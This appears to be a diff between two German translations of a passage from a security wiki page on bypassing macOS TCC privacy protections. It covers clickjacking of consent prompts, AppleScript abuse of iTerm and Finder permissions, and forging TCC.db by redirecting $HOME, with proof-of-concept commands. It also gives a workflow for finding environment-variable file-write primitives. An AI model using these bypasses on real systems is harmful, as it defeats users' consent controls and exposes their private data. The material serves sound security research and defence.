@@ -6,7 +6,7 @@
 
 ### Write Bypass
 
-Dies ist kein Bypass, sondern lediglich die Funktionsweise von TCC: **Es schützt nicht vor dem Schreiben**. Wenn Terminal **keinen Zugriff zum Lesen des Desktops eines Benutzers hat, kann es trotzdem darauf schreiben**:
+Dies ist kein Bypass, sondern einfach die Funktionsweise von TCC: **Es schützt nicht vor Schreibzugriffen**. Wenn Terminal **keinen Zugriff zum Lesen des Desktops eines Benutzers hat, kann es trotzdem darin schreiben**:
 ```shell-session
 username@hostname ~ % ls Desktop
 ls: Desktop: Operation not permitted
@@ -16,18 +16,18 @@ ls: Desktop: Operation not permitted
 username@hostname ~ % cat Desktop/lalala
 asd
 ```
-Das **erweiterte Attribut `com.apple.macl`** wird der neuen **Datei** hinzugefügt, um der **Creators-App** Lesezugriff darauf zu gewähren.<sup>[[2]](#references)</sup>
+Das **erweiterte Attribut `com.apple.macl`** wird der neuen **file** hinzugefügt, um der **creators app** Zugriff zum Lesen zu geben.<sup>[[2]](#references)</sup>
 
 ### TCC ClickJacking
 
-Es ist möglich, **ein Fenster über dem TCC-Prompt zu platzieren**, damit der Benutzer ihn **unbemerkt akzeptiert**. Einen PoC findest du unter [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**<sup>[[18]](#references)</sup>
+Es ist möglich, **ein Fenster über den TCC-Prompt zu legen**, damit der Benutzer ihn **unbemerkt akzeptiert**. Einen PoC findest du in [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**<sup>[[18]](#references)</sup>
 
 <figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>
 
 ### TCC Request by arbitrary name
 
-Ein Angreifer kann **Apps mit beliebigen Namen** (z. B. Finder, Google Chrome ...) in der **`Info.plist`** erstellen und sie dazu bringen, Zugriff auf einen durch TCC geschützten Ort anzufordern. Der Benutzer wird denken, dass die legitime Anwendung diesen Zugriff anfordert.\
-Außerdem ist es möglich, **die legitime App aus dem Dock zu entfernen und die gefälschte dort zu platzieren**, sodass beim Klicken auf die gefälschte App (die dasselbe Symbol verwenden kann) die legitime App aufgerufen, nach TCC-Berechtigungen gefragt und eine Malware ausgeführt werden kann. Dadurch glaubt der Benutzer, dass die legitime App den Zugriff angefordert hat.<sup>[[2]](#references)</sup>
+Ein Angreifer kann **Apps mit beliebigen Namen** (z. B. Finder, Google Chrome ...) in der **`Info.plist`** erstellen und sie auffordern lassen, auf einen durch TCC geschützten Ort zuzugreifen. Der Benutzer wird denken, dass die legitime Anwendung diesen Zugriff anfordert.\
+Außerdem ist es möglich, **die legitime App aus dem Dock zu entfernen und die gefälschte dort zu platzieren**. Wenn der Benutzer auf die gefälschte App klickt (die dasselbe Icon verwenden kann), könnte sie die legitime App aufrufen, TCC-Berechtigungen anfordern und eine Malware ausführen, sodass der Benutzer glaubt, die legitime App habe den Zugriff angefordert.<sup>[[2]](#references)</sup>
 
 <figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>
 
@@ -40,11 +40,11 @@ Weitere Informationen und einen PoC findest du unter:
 
 ### SSH Bypass
 
-Standardmäßig verfügte ein Zugriff über **SSH über "Full Disk Access"**. Um dies zu deaktivieren, muss SSH aufgeführt, aber deaktiviert sein (durch das Entfernen aus der Liste werden diese Berechtigungen nicht entfernt):<sup>[[2]](#references)</sup>
+Standardmäßig hatte ein Zugriff über **SSH "Full Disk Access"**. Um dies zu deaktivieren, muss SSH aufgelistet, aber deaktiviert sein (durch das Entfernen aus der Liste werden diese Berechtigungen nicht entfernt):<sup>[[2]](#references)</sup>
 
-![TCC Request by arbitrary name - SSH Bypass: By default an access via SSH used to have "Full Disk Access" . In order to disable this you need to have it listed but disabled (removing it...](<../../../../../images/image (1077).png>)
+![TCC Request by arbitrary name - SSH Bypass: Standardmäßig hatte ein Zugriff über SSH "Full Disk Access". Um dies zu deaktivieren, muss SSH aufgelistet, aber deaktiviert sein (durch das Entfernen ...](<../../../../../images/image (1077).png>)
 
-Hier findest du Beispiele dafür, wie einige **Malwares diesen Schutz umgehen konnten**:
+Hier findest du Beispiele dafür, wie einige **malwares diesen Schutz umgehen konnten**:
 
 - [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>
 
@@ -53,36 +53,36 @@ Hier findest du Beispiele dafür, wie einige **Malwares diesen Schutz umgehen ko
 
 ### Handle extensions - CVE-2022-26767
 
-Das Attribut **`com.apple.macl`** wird Dateien zugewiesen, um **einer bestimmten Anwendung Leseberechtigungen dafür zu gewähren.** Dieses Attribut wird gesetzt, wenn eine Datei per **Drag\&Drop** auf eine App gezogen wird oder wenn ein Benutzer auf eine Datei **doppelklickt**, um sie mit der **Standardanwendung** zu öffnen.
+Das Attribut **`com.apple.macl`** wird Dateien zugewiesen, um **einer bestimmten Anwendung Berechtigungen zum Lesen zu geben.** Dieses Attribut wird gesetzt, wenn eine Datei per **drag\&drop** auf eine App gezogen wird oder wenn ein Benutzer auf eine Datei **doppelklickt**, um sie mit der **Standardanwendung** zu öffnen.
 
-Daher könnte ein Benutzer eine **bösartige App registrieren**, die alle Erweiterungen verarbeitet, und Launch Services aufrufen, um eine beliebige Datei zu **öffnen** (wodurch der bösartigen Datei Lesezugriff gewährt wird).<sup>[[23]](#references)</sup>
+Daher könnte ein Benutzer eine **bösartige App registrieren**, die alle Erweiterungen verarbeitet, und Launch Services aufrufen, um eine beliebige Datei zu **öffnen** (dadurch erhält die bösartige Datei Zugriff zum Lesen).<sup>[[23]](#references)</sup>
 
 ### iCloud
 
-Mit dem Entitlement **`com.apple.private.icloud-account-access`** ist es möglich, mit dem **`com.apple.iCloudHelper`**-XPC-Service zu kommunizieren, der **iCloud-Tokens bereitstellt**.
+Mit dem Entitlement **`com.apple.private.icloud-account-access`** ist es möglich, mit dem **`com.apple.iCloudHelper`** XPC service zu kommunizieren, das **iCloud-Tokens bereitstellt**.
 
 **iMovie** und **Garageband** verfügten über dieses und weitere Entitlements, die dies ermöglichten.
 
-Weitere **Informationen** über den Exploit zum **Abrufen von iCloud-Tokens** über dieses Entitlement findest du im Vortrag: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>
+Weitere **Informationen** zum Exploit, mit dem sich **iCloud-Tokens** über dieses Entitlement abrufen lassen, findest du im Vortrag: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>
 
 ### kTCCServiceAppleEvents / Automation
 
 Eine App mit der Berechtigung **`kTCCServiceAppleEvents`** kann **andere Apps steuern**. Das bedeutet, dass sie möglicherweise die **den anderen Apps gewährten Berechtigungen missbrauchen** kann.<sup>[[2]](#references)</sup>
 
-Weitere Informationen zu Apple Scripts findest du hier:
+Weitere Informationen zu Apple Scripts findest du unter:
 
 
 {{#ref}}
 macos-apple-scripts.md
 {{#endref}}
 
-Wenn eine App beispielsweise über eine **Automation-Berechtigung für `iTerm`** verfügt, hat in diesem Beispiel **`Terminal`** Zugriff auf iTerm:
+Wenn eine App beispielsweise **Automation-Berechtigungen für `iTerm`** hat, kann in diesem Beispiel **`Terminal`** auf iTerm zugreifen:
 
 <figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>
 
-#### Over iTerm
+#### Über iTerm
 
-Terminal, das nicht über FDA verfügt, kann iTerm aufrufen, das über diese Berechtigung verfügt, und es zum Ausführen von Aktionen verwenden:
+Terminal, das kein FDA besitzt, kann iTerm aufrufen, das über diese Berechtigung verfügt, und es zur Ausführung von Aktionen verwenden:
 ```applescript:iterm.script
 tell application "iTerm"
 activate
@@ -98,9 +98,9 @@ end tell
 ```bash
 osascript iterm.script
 ```
-#### Über den Finder
+#### Über Finder
 
-Oder wenn eine App über den Finder Zugriff hat, könnte sie ein Skript wie dieses ausführen:
+Oder wenn eine App über Finder Zugriff hat, könnte sie ein Skript wie dieses ausführen:
 ```applescript
 set a_user to do shell script "logname"
 tell application "Finder"
@@ -114,10 +114,10 @@ do shell script "rm " & POSIX path of (copyFile as alias)
 
 ### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>
 
-Der **`tccd daemon`** im **userland** verwendete die **`HOME`**-**env**-Variable, um auf die TCC-Benutzerdatenbank unter folgendem Pfad zuzugreifen: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**
+Der **tccd daemon** im Userland verwendete die **`HOME`**-**env**-Variable, um auf die TCC users database unter folgendem Pfad zuzugreifen: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**
 
-Laut [diesem Stack-Exchange-Beitrag](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) und da der TCC daemon über **`launchd`** innerhalb der Domain des aktuellen Benutzers ausgeführt wird, ist es möglich, **alle an ihn übergebenen Environment-Variablen zu kontrollieren**.<sup>[[19]](#references)</sup>\
-Dadurch könnte ein **Angreifer die `$HOME`-Environment-Variable** in **`launchctl`** auf ein **kontrolliertes** **Verzeichnis** setzen, den **TCC** daemon neu starten und anschließend die **TCC-Datenbank direkt ändern**, um sich selbst **jede verfügbare TCC-Berechtigung** zu geben, ohne den Endbenutzer jemals dazu aufzufordern.<sup>[[1]](#references)</sup>\
+Laut [diesem Stack Exchange post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) und da der TCC daemon über **`launchd`** innerhalb der Domain des aktuellen Users ausgeführt wird, ist es möglich, **alle an ihn übergebenen environment variables zu kontrollieren**.<sup>[[19]](#references)</sup>\
+Dadurch könnte ein **attacker die `$HOME` environment variable** in **`launchctl`** so setzen, dass sie auf ein **kontrolliertes** **directory** zeigt, den **TCC** daemon **restarten** und anschließend die **TCC database direkt modifizieren**, um sich selbst **jedes verfügbare TCC entitlement** zu geben, ohne den Enduser jemals dazu aufzufordern.<sup>[[1]](#references)</sup>\
 PoC:
 ```bash
 # reset database just in case (no cheating!)
@@ -145,77 +145,77 @@ NULL,
 # list Documents directory without prompting the end user
 $> ls ~/Documents
 ```
-### CVE-2021-30761 - Notizen
+### CVE-2021-30761 - Notes
 
-Notizen hatte Zugriff auf durch TCC geschützte Orte, aber wenn eine Notiz erstellt wird, wird diese **an einem nicht geschützten Ort erstellt**. Daher konnte man Notizen auffordern, eine geschützte Datei in eine Notiz zu kopieren (also an einen nicht geschützten Ort) und anschließend auf die Datei zugreifen:
+Notes hatte Zugriff auf durch TCC geschützte Orte, aber eine neu erstellte Notiz wurde **an einem nicht geschützten Ort gespeichert**. Daher konnte ein Angreifer Notes anweisen, eine geschützte Datei in eine Notiz zu kopieren, und anschließend auf die resultierenden Daten am nicht geschützten Ort zugreifen:
 
 <figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>
 
 ### CVE-2021-30782 - Translocation
 
-Die Binary `/usr/libexec/lsd` mit der Library `libsecurity_translocate` verfügte über das Entitlement `com.apple.private.nullfs_allow`, wodurch sie **nullfs**-Mounts erstellen konnte, sowie über das Entitlement `com.apple.private.tcc.allow` mit **`kTCCServiceSystemPolicyAllFiles`**, um auf jede Datei zuzugreifen.
+Die Binary `/usr/libexec/lsd` mit der Library `libsecurity_translocate` besaß das Entitlement `com.apple.private.nullfs_allow`, wodurch sie **nullfs**-Mounts erstellen konnte, sowie das Entitlement `com.apple.private.tcc.allow` mit **`kTCCServiceSystemPolicyAllFiles`**, um auf jede Datei zuzugreifen.
 
-Es war möglich, das Quarantine-Attribut zu „Library“ hinzuzufügen, den **`com.apple.security.translocation`**-XPC-Service aufzurufen, woraufhin dieser Library nach **`$TMPDIR/AppTranslocation/d/d/Library`** abbildete, wo auf alle Dokumente innerhalb von Library **zugegriffen** werden konnte.
+Es war möglich, das Quarantine-Attribut zu "Library" hinzuzufügen, den **`com.apple.security.translocation`**-XPC-Service aufzurufen, woraufhin Library nach **`$TMPDIR/AppTranslocation/d/d/Library`** gemappt wurde, wo auf alle Dokumente innerhalb von Library **zugegriffen** werden konnte.
 
 ### CVE-2024-44131 - FileProvider symlink race
 
-Apps, die Dateioperationen an einen **privilegierten Helper** (hier **`fileproviderd`** / **Files.app**) übergeben, kopieren oder verschieben Elemente **im Namen des Benutzers**, sodass der Kopiervorgang mit den Privilegien des Helpers statt mit denen des Aufrufers ausgeführt wird.
+Apps, die Dateioperationen an einen **privilegierten Helper** (hier **`fileproviderd`** / **Files.app**) übergeben, kopieren oder verschieben Elemente **im Auftrag des Benutzers**, sodass der Kopiervorgang mit den Privilegien des Helpers anstelle der Privilegien des Aufrufers ausgeführt wird.
 
-Jamf Threat Labs zeigte, dass die vor der Operation durchgeführte Symlink-Validierung einem **Race** ausgesetzt werden kann: Statt den Symlink auf der **letzten** Pfadkomponente zu platzieren (die überprüft wird), tauscht der Angreifer ein **mittleres** Verzeichnis des Pfads **nach Beginn des Kopiervorgangs** aus. Der privilegierte Helper folgt dann dem vom Angreifer kontrollierten Link und liest oder schreibt TCC-geschützte Orte, **ohne jemals einen Prompt anzuzeigen**.<sup>[[5]](#references)</sup>
+Jamf Threat Labs zeigte, dass die vor der Operation durchgeführte Symlink-Validierung **einer Race Condition ausgesetzt** werden kann: Anstatt den Symlink am **letzten** Pfadbestandteil (der überprüft wird) zu platzieren, tauscht der Angreifer ein **intermediäres** Verzeichnis des Pfads aus, **nachdem der Kopiervorgang bereits begonnen hat**. Der privilegierte Helper folgt anschließend dem vom Angreifer kontrollierten Link und liest oder schreibt TCC-geschützte Orte, **ohne jemals eine Abfrage anzuzeigen**.<sup>[[5]](#references)</sup>
 
-Verzeichnisse, die in ihrem Pfad **nicht** durch eine zufällige UUID geschützt sind (zum Beispiel `~/Library/Mobile Documents/com~apple~CloudDocs`), sind die einfachsten Ziele, da der Angreifer den vollständigen Pfad für den Race vorhersagen kann.
+Verzeichnisse, die in ihrem Pfad **nicht** durch eine zufällige UUID geschützt sind (zum Beispiel `~/Library/Mobile Documents/com~apple~CloudDocs`), sind die einfachsten Ziele, da der Angreifer den vollständigen Pfad für die Race Condition vorhersagen kann.
 
 > [!TIP]
-> Dies ist das generische Muster, nach dem gesucht werden sollte: **Jeder privilegierte Prozess, der einen Pfad mehr als einmal auflöst** (Check-then-use oder `rename()`/`copyfile()`, wobei Quelle und Ziel separat aufgelöst werden) kann durch das Austauschen eines Verzeichnisses in der Mitte des Pfads einem Race ausgesetzt werden. Nur `O_NOFOLLOW_ANY`, `openat()` für einen bereits geöffneten Verzeichnis-FD oder `realpath()` + erneute Validierung schließen das Zeitfenster tatsächlich.
+> Dies ist das generische Muster, nach dem gesucht werden sollte: **Jeder privilegierte Prozess, der einen Pfad mehr als einmal auflöst** (Check-then-use oder ein separates Auflösen von Quelle und Ziel durch `rename()`/`copyfile()`) kann durch das Austauschen eines Verzeichnisses in der Mitte des Pfads einer Race Condition ausgesetzt werden. Nur `O_NOFOLLOW_ANY`, `openat()` für einen bereits geöffneten Verzeichnis-FD oder `realpath()` + erneute Validierung schließen dieses Zeitfenster tatsächlich.
 
-Weitere Informationen im [**Bericht von Jamf Threat Labs**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[5]](#references)</sup>
+Weitere Informationen finden sich im [**Bericht von Jamf Threat Labs**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[5]](#references)</sup>
 
 ### SQLITE_SQLLOG_DIR
 
 `libsqlite3` kann mit `SQLITE_ENABLE_SQLLOG` kompiliert werden, wodurch ein durch Umgebungsvariablen gesteuerter Logging-Hook hinzugefügt wird ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>
 
-- **`SQLITE_SQLLOG_DIR=path`** – für **jede geöffnete Datenbank** werden eine **Kopie der Datenbankdatei** und ein Protokoll der SQL-Anweisungen in `path` geschrieben (das Verzeichnis muss bereits existieren).
-- **`SQLITE_SQLLOG_REUSE_FILES=0`** – bei jedem Öffnen/Anhängen einer DB eine **neue Kopie** erstellen, statt eine vorhandene wiederzuverwenden.
-- **`SQLITE_SQLLOG_CONDITIONAL`** – eine Verbindung nur protokollieren, wenn neben der Haupt-DB eine Datei `<database>-sqllog` existiert.
+- **`SQLITE_SQLLOG_DIR=path`** – für **jede geöffnete Datenbank** werden eine **Kopie der Datenbankdatei** und ein Log der SQL-Anweisungen in `path` geschrieben (das Verzeichnis muss bereits existieren).
+- **`SQLITE_SQLLOG_REUSE_FILES=0`** – bei jedem Öffnen/Anhängen einer DB eine **neue Kopie** erstellen, anstatt eine vorhandene wiederzuverwenden.
+- **`SQLITE_SQLLOG_CONDITIONAL`** – eine Verbindung nur dann protokollieren, wenn neben der Haupt-DB eine Datei `<database>-sqllog` existiert.
 
-Wenn du diese Variable in einen Prozess einschleusen kannst, der über **FDA** verfügt und SQLite-Datenbanken öffnet, wird dieser die **geschützten Datenbanken** bereitwillig in ein von dir kontrolliertes Verzeichnis **kopieren**. Da der Zieldateiname aus angreifergesteuerten Daten abgeleitet wird, verwandelt ein **am Ziel platzierter Symlink** dieselbe Primitive in einen **beliebigen Dateischreibzugriff** mit den Privilegien des Zielprozesses.
+Wenn diese Variable in einen Prozess eingeschleust werden kann, der über **FDA** verfügt und SQLite-Datenbanken öffnet, kopiert dieser bereitwillig **diese geschützten Datenbanken** in ein von dir kontrolliertes Verzeichnis. Da der Zieldateiname aus vom Angreifer kontrollierten Daten abgeleitet wird, verwandelt ein am Ziel platzierter **Symlink** dasselbe Primitive in einen **beliebigen Dateischreibvorgang** mit den Privilegien des Zielprozesses.
 
 ### **SQLITE_AUTO_TRACE**
 
-Wenn die Umgebungsvariable **`SQLITE_AUTO_TRACE`** gesetzt ist, beginnt die Library **`libsqlite3.dylib`**, alle SQL-Abfragen **zu protokollieren**. Viele Anwendungen verwendeten diese Library, daher war es möglich, alle ihre SQLite-Abfragen zu protokollieren.<sup>[[22]](#references)</sup>
+Wenn die Umgebungsvariable **`SQLITE_AUTO_TRACE`** gesetzt ist, beginnt die Library **`libsqlite3.dylib`**, alle SQL-Abfragen zu **protokollieren**. Viele Anwendungen verwendeten diese Library, sodass es möglich war, alle ihre SQLite-Abfragen zu protokollieren.<sup>[[22]](#references)</sup>
 
-Mehrere Apple-Anwendungen verwendeten diese Library, um auf TCC-geschützte Informationen zuzugreifen.
+Mehrere Apple-Anwendungen verwendeten diese Library, um auf durch TCC geschützte Informationen zuzugreifen.
 ```bash
 # Set this env variable everywhere
 launchctl setenv SQLITE_AUTO_TRACE 1
 ```
-### Auf Umgebungsvariablen basierende Dateischreibvorgänge aufspüren
+### Aufspüren von durch Umgebungsvariablen gesteuerten Dateischreibvorgängen
 
-Die beiden vorherigen Einträge sind Beispiele für dieselbe generische Technik, und es lohnt sich, nach weiteren zu suchen: **In TCC-privilegierte Apps geladene frameworks stellen oft Debug-/Logging-Umgebungsvariablen bereit, die den Prozess dazu bringen, eine Datei an einem vom Aufrufer kontrollierten Pfad zu erstellen**.
+Die beiden vorherigen Einträge sind Beispiele für dieselbe generische Technik, und es lohnt sich, nach weiteren zu suchen: **In TCC-privilegierte Apps geladene frameworks stellen häufig Debug-/Logging-Umgebungsvariablen bereit, durch die der Prozess eine Datei an einem vom Aufrufer kontrollierten Pfad erstellt**.
 
-Workflow zum Auffinden solcher Variablen:
+Vorgehensweise:
 
 1. Wähle ein Ziel mit FDA oder einer anderen interessanten TCC-Berechtigung (`Music`, `TV`, `Terminal`, MDM agents...) und liste die frameworks auf, mit denen es verknüpft ist (`otool -L`, `vmmap`).
 2. Durchsuche diese frameworks nach `getenv`-Strings: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
 3. Setze Kandidatenvariablen über `launchctl setenv NAME /path/you/control`, starte die App und beobachte mit `fs_usage -w -f filesys <pid>` oder `sudo fs_usage | grep <path>`, was sie im Dateisystem macht.
-4. Wenn der Prozess eine Datei in deinem Verzeichnis **erstellt oder umbenennt**, hast du ein write primitive: Verweise das Ziel auf einen symlink (oder race ein Zwischenverzeichnis, wie oben bei CVE-2024-44131) und leite es dadurch auf `~/Library/Application Support/com.apple.TCC/TCC.db` um.
+4. Wenn der Prozess eine Datei in deinem Verzeichnis **erstellt oder umbenennt**, hast du ein write primitive: Zeige das Ziel auf einen Symlink (oder race ein Zwischenverzeichnis, wie oben bei CVE-2024-44131), um die Datei nach `~/Library/Application Support/com.apple.TCC/TCC.db` umzuleiten.
 
 > [!TIP]
-> Zwei Dinge schränken dies ein. Erstens werden **`DYLD_*`-Variablen für hardened-runtime-Binaries ignoriert**, sofern die App nicht das Entitlement [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) enthält ("a Boolean value that indicates whether the app may be affected by dynamic linker environment variables, which you can use to inject code into your app's process") — siehe auch [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Zweitens entfernt Apple einzelne framework-Debugvariablen, sobald diese gemeldet werden. Daher ist eine Variable, die in einer macOS-Version funktioniert hat, in der nächsten oft verschwunden. Wenn eine App den Start stillschweigend verweigert, nachdem du eine Variable gesetzt hast, behandle diese Variable als bereits gefiltert.<sup>[[7]](#references)[[8]](#references)</sup>
+> Zwei Dinge schränken dies ein. Erstens werden **`DYLD_*`-Variablen bei Binaries mit hardened runtime ignoriert**, sofern die App nicht das Entitlement [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) enthält („a Boolean value that indicates whether the app may be affected by dynamic linker environment variables, which you can use to inject code into your app's process“) — siehe auch [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Zweitens entfernt Apple einzelne framework-Debugvariablen, sobald diese gemeldet werden. Daher ist eine Variable, die in einer macOS-Version funktioniert hat, in der nächsten häufig verschwunden. Wenn eine App nach dem Setzen einer solchen Variable die Ausführung stillschweigend verweigert, solltest du davon ausgehen, dass diese Variable bereits gefiltert wird.<sup>[[7]](#references)[[8]](#references)</sup>
 
-Unter [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) findest du die entsprechende Methode mit linker-Variablen.
+Unter [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) findest du den entsprechenden Trick mit linker variables.
 
 ### Apple Remote Desktop
 
-Als root könntest du diesen Service aktivieren, und der **ARD agent hätte vollständigen Festplattenzugriff**, der anschließend von einem Benutzer missbraucht werden könnte, um eine neue **TCC-Benutzerdatenbank** zu kopieren.
+Als root könntest du diesen Service aktivieren, und der **ARD agent hätte full disk access**, was anschließend von einem Benutzer missbraucht werden könnte, um eine neue **TCC user database** zu kopieren.
 
 ## Über **NFSHomeDirectory**
 
 TCC verwendet eine Datenbank im HOME-Ordner des Benutzers, um den Zugriff auf benutzerspezifische Ressourcen unter **$HOME/Library/Application Support/com.apple.TCC/TCC.db** zu kontrollieren.\
-Wenn es dem Benutzer daher gelingt, TCC mit einer `$HOME`-Umgebungsvariable neu zu starten, die auf einen **anderen Ordner** verweist, könnte der Benutzer eine neue TCC-Datenbank unter **/Library/Application Support/com.apple.TCC/TCC.db** erstellen und TCC dazu bringen, jeder App eine beliebige TCC-Berechtigung zu gewähren.
+Wenn es dem Benutzer daher gelingt, TCC mit einer $HOME-Umgebungsvariable neu zu starten, die auf einen **anderen Ordner** zeigt, könnte der Benutzer eine neue TCC-Datenbank unter **/Library/Application Support/com.apple.TCC/TCC.db** erstellen und TCC dazu bringen, einer beliebigen App jede TCC-Berechtigung zu gewähren.
 
 > [!TIP]
-> Beachte, dass Apple die in den Benutzerprofildaten gespeicherte Einstellung im Attribut **`NFSHomeDirectory`** für den **Wert von `$HOME`** verwendet. Wenn du daher eine Anwendung mit Berechtigungen zum Ändern dieses Werts (**`kTCCServiceSystemPolicySysAdminFiles`**) kompromittierst, kannst du diese Option mit einem TCC bypass **weaponizen**.
+> Beachte, dass Apple für den **Wert von `$HOME`** die Einstellung verwendet, die im Benutzerprofil im Attribut **`NFSHomeDirectory`** gespeichert ist. Wenn du eine Anwendung mit Berechtigungen zum Ändern dieses Werts (**`kTCCServiceSystemPolicySysAdminFiles`**) kompromittierst, kannst du diese Option mit einem TCC bypass **weaponize**.
 
 ### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>
 
@@ -225,43 +225,43 @@ Wenn es dem Benutzer daher gelingt, TCC mit einer `$HOME`-Umgebungsvariable neu 
 
 Der **erste POC** verwendet [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) und [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/), um den **HOME**-Ordner des Benutzers zu ändern.
 
-1. Beschaffe einen _csreq_-Blob für die Ziel-App.
-2. Platziere eine gefälschte _TCC.db_-Datei mit dem erforderlichen Zugriff und dem _csreq_-Blob.
+1. Rufe einen _csreq_-Blob für die Ziel-App ab.
+2. Platziere eine gefälschte _TCC.db_-Datei mit den erforderlichen Zugriffsrechten und dem _csreq_-Blob.
 3. Exportiere den Directory-Services-Eintrag des Benutzers mit [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
 4. Ändere den Directory-Services-Eintrag, um das Home-Verzeichnis des Benutzers zu ändern.
 5. Importiere den geänderten Directory-Services-Eintrag mit [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
 6. Stoppe das _tccd_ des Benutzers und starte den Prozess neu.
 
-Der zweite POC verwendete **`/usr/libexec/configd`**, das über `com.apple.private.tcc.allow` mit dem Wert `kTCCServiceSystemPolicySysAdminFiles` verfügte.\
-Es war möglich, **`configd`** mit der Option **`-t`** auszuführen, wobei ein Angreifer ein **benutzerdefiniertes zu ladendes Bundle** angeben konnte. Daher ersetzt der Exploit die Methode zum Ändern des Home-Verzeichnisses über **`dsexport`** und **`dsimport`** durch eine **`configd`-code injection**.
+Der zweite POC verwendete **`/usr/libexec/configd`**, das `com.apple.private.tcc.allow` mit dem Wert `kTCCServiceSystemPolicySysAdminFiles` besaß.\
+Es war möglich, **`configd`** mit der Option **`-t`** auszuführen; ein Angreifer konnte ein **custom Bundle zum Laden** angeben. Daher **ersetzt** der Exploit die Methode zum Ändern des Home-Verzeichnisses über **`dsexport`** und **`dsimport`** durch eine **`configd` code injection**.
 
 Weitere Informationen findest du im [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[[11]](#references)</sup>
 
 ## Über process injection
 
-Es gibt verschiedene Techniken, um Code in einen Prozess zu injizieren und dessen TCC-Privilegien zu missbrauchen:
+Es gibt verschiedene Techniken, um Code in einen Prozess zu injizieren und dessen TCC-Berechtigungen zu missbrauchen:
 
 
 {{#ref}}
 ../../../macos-proces-abuse/
 {{#endref}}
 
-Die häufigste gefundene process injection zum Umgehen von TCC erfolgt außerdem über **plugins (load library)**.\
-Plugins sind zusätzlicher Code, üblicherweise in Form von libraries oder plist-Dateien, der von der **Hauptanwendung geladen** wird und in deren Kontext ausgeführt wird. Wenn die Hauptanwendung daher Zugriff auf TCC-beschränkte Dateien hatte (über gewährte Berechtigungen oder Entitlements), verfügt auch der **benutzerdefinierte Code darüber**.
+Darüber hinaus erfolgt der häufigste gefundene process injection zum Umgehen von TCC über **plugins (load library)**.\
+Plugins sind zusätzlicher Code, üblicherweise in Form von libraries oder plist-Dateien, der **von der Hauptanwendung geladen** wird und unter deren Kontext ausgeführt wird. Wenn die Hauptanwendung daher Zugriff auf TCC-beschränkte Dateien hatte (über gewährte Berechtigungen oder entitlements), hat auch der **custom code diesen Zugriff**.
 
 ### CVE-2020-27937 - Directory Utility
 
-Die Anwendung `/System/Library/CoreServices/Applications/Directory Utility.app` verfügte über das Entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, lud Plugins mit der Erweiterung **`.daplug`** und hatte keine **hardened** runtime.
+Die Anwendung `/System/Library/CoreServices/Applications/Directory Utility.app` besaß das Entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, lud plugins mit der Erweiterung **`.daplug`** und verwendete keine **hardened** runtime.
 
-Um diese CVE zu weaponizen, wird **`NFSHomeDirectory`** geändert (unter Missbrauch des vorherigen Entitlements), um die **TCC-Datenbank des Benutzers zu übernehmen** und TCC zu umgehen.
+Um diese CVE zu weaponize, wird **`NFSHomeDirectory`** geändert (unter Ausnutzung des vorherigen Entitlements), damit die **TCC-Datenbank des Benutzers übernommen** und TCC umgangen werden kann.
 
 Weitere Informationen findest du im [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[[12]](#references)</sup>
 
 ### CVE-2020-29621 - Coreaudiod
 
